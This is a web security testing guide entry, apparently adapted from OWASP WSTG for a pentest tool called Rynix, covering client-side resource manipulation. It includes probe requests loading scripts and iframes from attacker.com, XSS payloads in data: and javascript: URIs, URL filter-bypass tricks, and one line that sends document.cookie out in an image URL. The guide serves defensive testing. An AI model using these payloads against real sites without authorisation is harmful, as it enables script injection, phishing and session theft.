---
id: WSTG-CLNT-06
title: Testing for Client-side Resource Manipulation
category: Client-Side
severity_range: Low-Medium
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation
---

# WSTG-CLNT-06: Testing for Client-side Resource Manipulation

## Summary

Client-side resource manipulation occurs when JavaScript code dynamically sets the URL or source of a resource (script, image, iframe, stylesheet, link) based on user-controllable input. An attacker can manipulate these resource URLs to load malicious scripts, iframes, or stylesheets from attacker-controlled domains, leading to cross-site scripting, phishing, data theft, or session hijacking.

## Test Objectives

- Identify JavaScript code that dynamically sets resource URLs from user input
- Test if external resources can be loaded from attacker-controlled domains
- Assess the impact of resource manipulation (script injection, phishing, data theft)
- Check for Subresource Integrity (SRI) implementation

## Prerequisites

- Target application uses JavaScript to dynamically load resources
- Docker pentest container capturing traffic
- JavaScript source code accessible for analysis

## Test Steps

### Step 1: Identify Dynamic Resource Loading

**CLI Actions:**
Use `curl` to fetch JavaScript files and search for dynamic resource patterns:

```
GET /static/js/app.js HTTP/1.1
Host: target.com
```

Search for patterns where user input controls resource URLs:
```javascript
element.src = userInput
element.href = userInput
$.getScript(userInput)
document.createElement('script').src = userInput
document.createElement('link').href = userInput
document.createElement('iframe').src = userInput
fetch(userInput)
XMLHttpRequest.open('GET', userInput)
```

### Step 2: Test Script Source Manipulation

**CLI Actions:**
Use `curl` to test if script source URLs can be controlled:

```
GET /page?widget=//attacker.com/evil.js HTTP/1.1
Host: target.com
```

```
GET /page?plugin=https://attacker.com/script.js HTTP/1.1
Host: target.com
```

Use `curl` to verify if the browser makes a request to the attacker-controlled URL when the page loads.

### Step 3: Test Iframe Source Manipulation

**CLI Actions:**
Use `curl` to test if iframe sources can be controlled:

```
GET /page?frame=https://attacker.com/phishing HTTP/1.1
Host: target.com
```

```
GET /page?content=//attacker.com/fake-page HTTP/1.1
Host: target.com
```

```
GET /page?src=data:text/html,<script>alert('XSS')</script> HTTP/1.1
Host: target.com
```

### Step 4: Test Stylesheet Manipulation

**CLI Actions:**
Use `curl` to test if stylesheet URLs can be controlled:

```
GET /page?theme=//attacker.com/evil.css HTTP/1.1
Host: target.com
```

A malicious stylesheet can:
- Override page content for phishing
- Exfiltrate data via CSS attribute selectors
- Import additional malicious resources

### Step 5: Test Image Source Manipulation for Tracking

**CLI Actions:**
Use `curl` to test if image sources can be controlled:

```
GET /page?avatar=http://attacker.com/tracking-pixel.gif HTTP/1.1
Host: target.com
```

While image manipulation alone is low severity, if the image URL includes sensitive data (session tokens, user IDs) from the page, it becomes a data exfiltration vector:

```javascript
// If JavaScript does:
img.src = userURL + '?token=' + document.cookie;
```

### Step 6: Check for Subresource Integrity

**CLI Actions:**
Use `curl` to fetch pages and check if external resources have SRI attributes:

```
GET / HTTP/1.1
Host: target.com
```

Look for `integrity` attributes on script and link tags:
```html
<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous">
```

If SRI is missing on externally loaded resources, those resources are vulnerable to supply chain attacks even without user-controlled URLs.

Use `rynix_plugin_run('template-scan')` to check for resource manipulation or missing SRI findings.

## Payloads

### Script Source Manipulation
```
//attacker.com/evil.js
https://attacker.com/evil.js
data:text/javascript,alert('XSS')
data:text/javascript;base64,YWxlcnQoJ1hTUycp
javascript:alert('XSS')
```

### Iframe Source Manipulation
```
//attacker.com/phishing
data:text/html,<h1>Phishing</h1>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
javascript:alert('XSS')
```

### Stylesheet Manipulation
```
//attacker.com/evil.css
data:text/css,*{display:none}body:after{display:block;content:'Hacked'}
```

### Resource URL Bypass Techniques
```
# Protocol-relative
//attacker.com/resource
# Double encoding
%2F%2Fattacker.com/resource
# URL with credentials
https://attacker.com%40target.com/resource
# Null byte
https://target.com%00.attacker.com/resource
```

### Common Resource Parameter Names
```
src
url
source
resource
widget
plugin
theme
template
script
style
frame
content
load
import
```

## Detection Criteria

A finding should be logged when:
- JavaScript dynamically sets script sources from user-controllable input
- Iframe sources can be controlled to load attacker-hosted content
- External stylesheets can be loaded from attacker-controlled URLs
- Image or resource URLs include sensitive data from the page
- Subresource Integrity is missing on externally loaded scripts and stylesheets
- Fetch or XMLHttpRequest URLs can be controlled by user input

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Script source controllable, leading to JavaScript execution | High |
| Iframe source controllable, enabling convincing phishing | Medium |
| Stylesheet source controllable, enabling CSS-based attacks | Medium |
| Fetch/XHR URL controllable, enabling SSRF-like behavior | Medium |
| Image source controllable with sensitive data in URL | Medium |
| Missing SRI on critical third-party scripts | Medium |
| Image source controllable but no data exfiltration | Low |
| Missing SRI on non-critical resources (fonts, icons) | Low |
| All resource URLs validated against allowlist with SRI | Not a finding |

## Remediation

- Validate all dynamically loaded resource URLs against a strict allowlist
- Implement Subresource Integrity (SRI) for all external scripts and stylesheets
- Use Content-Security-Policy `script-src`, `style-src`, `frame-src` directives to restrict resource origins
- Avoid constructing resource URLs from user input
- If dynamic resource loading is necessary, use a server-side proxy to validate and fetch resources
- Never include sensitive data in resource URLs
- Use `crossorigin` attribute with SRI for CORS-enabled resources
- Implement `sandbox` attribute on iframes to restrict capabilities

## References

- [OWASP Testing Guide - Client-side Resource Manipulation](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
- [MDN - Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

